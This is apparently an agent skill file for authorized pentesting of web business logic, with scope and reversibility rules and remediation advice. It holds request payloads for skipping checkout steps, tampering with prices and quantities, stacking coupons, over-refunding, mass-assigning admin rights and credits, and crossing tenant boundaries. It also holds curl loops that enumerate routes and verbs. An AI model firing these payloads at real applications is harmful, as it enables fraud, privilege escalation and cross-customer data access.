---
name: web-business-logic
description: "Business-logic testing for a pentest-team engagement — mapping money and account flows as state machines, then probing each transition on four axes (state, identity, input, frequency): workflow/step-skip and state-downgrade bypass, price/quantity/currency/coupon manipulation, refund and payout abuse, mass-assignment and tenant-boundary confusion, quota/tier abuse, and chaining single-axis flaws into a financial-impact chain. Load it when the appsec-triage business-logic sweep turns up a logic-flaw lead on a claimed web/API target."
---

# Business Logic — under the engagement protocol

Deep methodology for the business-logic class. You reach here from the `appsec-triage` business-logic sweep with a lead on a surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Every request runs against a target you own on the board and that is on the `ROE.md` allowlist — nothing else.
- **Prove with a reversible marker transaction, never real data.** Confirm the flaw against a *planted* order, a test tenant, or a single marker record — then reverse the side effect (cancel the order, restore the balance, delete the seat) and log both legs. No-real-data means you prove the discount applied or the total went negative, not that you drained a live wallet.
- **Read before write; destructive or outward-facing goes to the anchor.** Probing a transition with a real payout, a chargeback, a refund that moves real money, or a mutation you cannot reverse is destructive — mark the surface blocked and route through the lead to the anchor for the human's explicit go before running it. A state read or a marker mutation you can undo makes the point without the risk.
- **Rate-limit and coordinate load.** Coupon-stacking loops and verb sweeps against a shared host can trip a WAF ban or lockout for the whole team. Throttle, and coordinate load on the board — a logic flaw does not need volume to prove.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a re-runnable request sequence and the state delta another operator could reproduce.

## Quick workflow

1. Map each money/account flow as a state machine: states, allowed transitions, side effects.
2. For every transition ask: who can call it, in what state, with what inputs, how many times.
3. Probe each axis (state, identity, input, frequency) against a marker record, reversing side effects.
4. Chain single-axis flaws — a chain to real value is the finding that leads the report.
5. File with the intended-vs-achieved flow, the exact sequence, and the impact per execution.

## Map the logic surface

For each top money flow (checkout, refund, payout, subscription) draw states (`cart → paid → shipped → refunded`), the API/UI action per transition, the role that may call it, and the side effect (balance, inventory, email, webhook). Hunt transitions that skip a state, are reversible when they should not be, fire a side effect twice, or accept cross-role callers.

```bash
# Buried routes: diff authed vs unauthed bundle for admin/feature toggles
diff <(curl -s https://<in-scope>/main.js) <(curl -s -H "Cookie: $C" https://<in-scope>/main.js)
grep -E '(isAdmin|isInternal|featureFlag|debug)' bundle.js
# The API spec lists transitions the UI never calls
curl -s https://<in-scope>/api/openapi.json | jq '.paths | keys'
```

## Workflow / state-machine bypass

```http
# Skip a required step — jump past /payment
POST /api/order/confirm
{ "cartId": "current", "paymentRef": "<old-paid-order-payment-ref>" }
```
```http
# State downgrade: move a finalized object back to editable, then mutate the price
PUT /api/order/<marker-order> {"status":"draft"}
PUT /api/order/<marker-order> {"items":[{"id":"tv","price":1}]}
```
Use a marker order you planted; if the downgrade sticks, that proves it — do not push it through to a real fulfilment. Direct-invocation of hidden admin transitions is a route-level RBAC gap; enumerate verbs read-only and stop at the first non-4xx rather than firing the mutation:

```bash
for path in $(cat paths.txt); do for v in GET OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $v -H "Authorization: Bearer $T" https://<in-scope>$path)
  echo "$v $path $code"; done; done | grep -vE ' (401|403|404) '
```
A reachable state-changing verb (PUT/PATCH/DELETE) is proven by the RBAC gap on a safe verb plus one marker-scoped write you reverse — not by mutating real state.

## Price / quantity / currency manipulation

```http
POST /api/cart/add {"sku":"marker","qty":-1}        # negative → credit?
POST /api/cart/add {"sku":"marker","qty":0.0001}    # float rounds to $0 line?
POST /api/checkout {"items":[{"sku":"marker","qty":1,"price":1}],"total":1,"tax":0}
POST /api/checkout {"amount":100,"currency":"JPY"}  # currency confusion vs USD price
```
Test every numeric field the server might trust — `price`, `total`, `discount`, `tax`, `shipping`, `subtotal`, `currency`. Prove with a marker SKU and a cart you abandon; the discounted total in the response is the evidence, not a completed purchase.

## Coupon / discount logic

```http
POST /api/cart/coupon {"code":"SAVE50"}   # then again → stacks?
POST /api/cart/coupon {"code":"save50"}   # case gives a second slot?
POST /api/cart/coupon {"code":"SAVE50 "}  # whitespace ditto?
POST /api/cart/apply-coupon {"code":"FREEMOUSE","appliedTo":"macbook"}  # coupon for wrong product
```
Concurrent redemption of a single-use coupon is a race — see `web-race-condition`. Prove stacking by the total the response shows; abandon the cart.

## Refund / payout / tenant boundary

```http
POST /api/orders/<marker>/refund {"amount":99999}     # refund more than paid?
POST /api/orders/<marker>/refund {"method":"store-credit"}  # convert card → transferable credit
```
A refund that moves real money is destructive — gate it: prove reachability against a marker order (the endpoint accepts an over-refund amount, returns a would-refund total) and route the actual money movement to the anchor. Identity/tenant abuse:

```http
POST /api/users/me      role=user&role=admin           # last-wins parser
PUT  /api/users/me      {"email":"x@y","isAdmin":true,"credits":10000,"tenantId":"<test-tenant-B>"}
POST /api/invoices      {"amount":100,"tenantId":"<test-tenant-B>","billTo":"<test-tenant-A>"}
```
Prove mass-assignment and cross-tenant breaks against a second **test** tenant or a planted marker — never a real customer org. Test every field on the model, not just the ones the form exposes.

## Quota / tier abuse

```http
PUT /api/subscription {"tier":"pro"}    # +1000 quota
PUT /api/subscription {"tier":"free"}   # resets to 0, or just caps display?
PUT /api/subscription {"tier":"pro"}    # +1000 again → net double in one cycle
POST /api/addons {"id":"extra-storage"} # stacks on repeat?
```
Downgrade-retains-premium and mid-cycle quota reset are proven on your own test account; reverse the subscription state when done.

## Chaining — where the crits live

Single-axis flaws are low; chains are the report's lead. The template: find a thing the system gives you (credit, points, seat), a way to multiply it (race, replay, stacking — see `web-race-condition`), and a way to convert it to value (transfer, refund, payout). Write the chain as one narrative finding citing each link, with a scripted end-to-end PoC (no manual steps) proven against markers and a dollar-per-execution with a scaling statement — triagers downgrade logic chains they cannot follow.

## Remediation (for the finding)

1. **Fix** — enforce the state machine server-side: a transition validator that checks precondition, role, and idempotency at the authoritative layer; never trust client-supplied `price`/`total`/`role`/`tenantId`; recompute money from server-side product and FX data.
2. **Defense in depth** — idempotency keys on one-shot actions, atomic `UPSERT`/conditional writes for balances, per-model field allowlists (reject unknown/read-only fields), server-side FX normalization, coupon uniqueness constraints.
3. **Detection** — a SIEM rule on the anomaly the flaw produced: negative/zero totals, refunds exceeding original charge, tier oscillation within a cycle, cross-tenant id in a request body.

Write it up in the `appsec-reporting` finding format, CWE-840 / A04:2021 Insecure Design, with the intended-vs-achieved flow diagram and the marker-based reproduction.
